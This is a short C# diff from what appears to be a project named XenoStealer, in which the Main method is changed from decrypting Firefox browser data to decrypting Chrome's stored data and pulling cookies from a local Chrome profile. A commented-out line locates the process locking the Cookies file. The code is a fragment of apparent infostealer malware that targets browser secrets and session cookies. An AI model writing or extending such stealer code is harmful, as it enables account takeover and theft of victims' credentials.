@@ -13,13 +13,10 @@ namespace XenoStealer
     {
         public static void Main(string[] args)
         {
+            ChromeDecryptor a = new ChromeDecryptor(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data");
 
-            bool g = Environment.Is64BitProcess;
-
-
-            GeckoDecryptor a = new GeckoDecryptor(@"C:\Program Files\Mozilla Firefox");
-            var t=Gecko.GetAllInfo(DataExtractionStructs.GeckoBrowserOptions.All);
-            var y = g;
+            var t=Chromium.GetCookies(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default", a);
+            var y = 0;
             //Utils.GetProcessLockingFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", out var asd);
 
             
